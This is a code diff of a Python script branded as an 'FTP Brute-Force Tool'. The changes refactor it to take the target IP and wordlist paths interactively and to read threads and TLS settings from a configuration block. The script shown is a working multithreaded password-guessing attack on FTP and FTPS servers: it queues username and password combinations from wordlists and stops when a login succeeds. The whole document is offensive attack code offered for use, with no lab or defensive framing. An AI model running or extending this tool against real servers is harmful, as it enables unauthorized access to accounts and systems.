@@ -1,12 +1,21 @@
 import os
 import sys
-import argparse
 import threading
 from queue import Queue
 from datetime import datetime
 from ftplib import FTP, FTP_TLS
 
 print_lock = threading.Lock()
+
+# --- Configuration ---
+# You can change the default paths and settings here
+CONFIG = {
+    "userlist": "wordlists/usernames.txt",
+    "passlist": "wordlists/passwords.txt",
+    "output": "results.log",
+    "threads": 10,
+    "use_tls": None # Set to True for FTPS, False for FTP, or None to auto-detect
+}
 
 # -------------------------------
 # Load wordlist (with built-in fallback)
@@ -74,7 +83,7 @@ def worker(queue, target, use_tls, log_file, stop_flag):
             stop_flag["found"] = True
         except Exception as e:
             with print_lock:
-                print(f"[-] Failed: {username}:{password} ({e})")
+                print(f"[-] Failed: {username}:{password}")
         finally:
             queue.task_done()
 
@@ -82,21 +91,18 @@ def worker(queue, target, use_tls, log_file, stop_flag):
 # Main brute-force logic
 # -------------------------------
 def brute_force_ftp(target, userlist, passlist, output, threads, use_tls):
-    # Load usernames from file, no fallback
-    if os.path.isfile(userlist):
-        with open(userlist, "r") as f:
-            usernames = [line.strip() for line in f if line.strip()]
-    else:
+    if not os.path.isfile(userlist):
         print(f"[!] Username file not found: {userlist}")
         return
 
-    # Load passwords from file, no fallback
-    if os.path.isfile(passlist):
-        with open(passlist, "r") as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    else:
+    if not os.path.isfile(passlist):
         print(f"[!] Password file not found: {passlist}")
         return
+
+    with open(userlist, "r") as f:
+        usernames = [line.strip() for line in f if line.strip()]
+    with open(passlist, "r") as f:
+        passwords = [line.strip() for line in f if line.strip()]
 
     if not usernames or not passwords:
         print("[!] Empty username or password list.")
@@ -115,10 +121,12 @@ def brute_force_ftp(target, userlist, passlist, output, threads, use_tls):
     log_event(output, f"Brute-force started on {target} (TLS: {'ON' if use_tls else 'OFF'})")
 
     stop_flag = {"found": False}
+    thread_pool = []
     for _ in range(threads):
         t = threading.Thread(target=worker, args=(combo_queue, target, use_tls, output, stop_flag))
         t.daemon = True
         t.start()
+        thread_pool.append(t)
 
     combo_queue.join()
 
@@ -129,7 +137,8 @@ def brute_force_ftp(target, userlist, passlist, output, threads, use_tls):
 # -------------------------------
 # Entry Point
 # -------------------------------
-banner = r"""
+def main():
+    banner = r"""
   _____ _____ ____  ____  ____  _   _ _____ _____ _____ ___  ____   ____ _____ 
 |  ___|_   _|  _ \| __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____|
 | |_    | | | |_) |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|  
@@ -137,35 +146,25 @@ banner = r"""
 |_|     |_| |_|   |____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____|                                                                     
                       🔐 FTP Brute-Force Tool
 """
-print(banner)
+    print(banner)
+    
+    target_ip = input("Enter target FTP server IP: ").strip()
+    if not target_ip:
+        print("[!] Target IP cannot be empty.")
+        return
 
-def main():
-    usage_text = "ftp_brute_forcer.py [-h] -t TARGET [-U USERLIST] [-P PASSLIST]"
-    parser = argparse.ArgumentParser(
-        description="🔐 FTP Brute-Forcer (Multithreaded + FTPS + Auto Wordlists)",
-        usage=usage_text
+    userlist_path = input(f"Enter username wordlist path [{CONFIG['userlist']}]: ").strip() or CONFIG['userlist']
+    passlist_path = input(f"Enter password wordlist path [{CONFIG['passlist']}]: ").strip() or CONFIG['passlist']
+
+    brute_force_ftp(
+        target=target_ip,
+        userlist=userlist_path,
+        passlist=passlist_path,
+        output=CONFIG["output"],
+        threads=CONFIG["threads"],
+        use_tls=CONFIG["use_tls"]
     )
-    parser.add_argument("-t", "--target", required=True, help="Target FTP server IP")
-    parser.add_argument("-U", "--userlist", default="wordlists/usernames.txt", help="Username wordlist path")
-    parser.add_argument("-P", "--passlist", default="wordlists/passwords.txt", help="Password wordlist path")
-    parser.add_argument("-o", "--output", default="results.log", help="Log file path")
-    parser.add_argument("--tls", action="store_true", help="Force FTP over TLS (FTPS)")
-    parser.add_argument("--ftp", action="store_true", help="Force plain FTP (no TLS)")
-    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")
-
-    args = parser.parse_args()
-
-    if args.tls and args.ftp:
-        print("[!] Cannot use both --tls and --ftp flags at the same time.")
-        sys.exit(1)
-
-    use_tls = None
-    if args.tls:
-        use_tls = True
-    elif args.ftp:
-        use_tls = False
-
-    brute_force_ftp(args.target, args.userlist, args.passlist, args.output, args.threads, use_tls)
 
 if __name__ == "__main__":
     main()
+
